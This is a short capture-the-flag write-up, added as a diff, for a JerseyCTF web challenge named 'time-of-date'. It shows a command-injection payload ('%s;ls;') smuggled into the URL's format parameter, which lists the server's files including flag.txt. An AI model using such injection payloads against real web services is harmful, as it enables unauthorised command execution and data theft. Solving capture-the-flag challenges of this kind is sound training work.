@@ -1,0 +1,7 @@
+http://time-of-date.aws.jerseyctf.com/?format=%22%Y-%m-%d%22
+Typing in this in the web browser
+http://time-of-date.aws.jerseyctf.com/?format=%s;ls;
+will lead to this
+1743277057 dist flag.txt index.ts node_modules package-lock.json package.json tsconfig.json
+
+which will allow me to print out the flag.txt
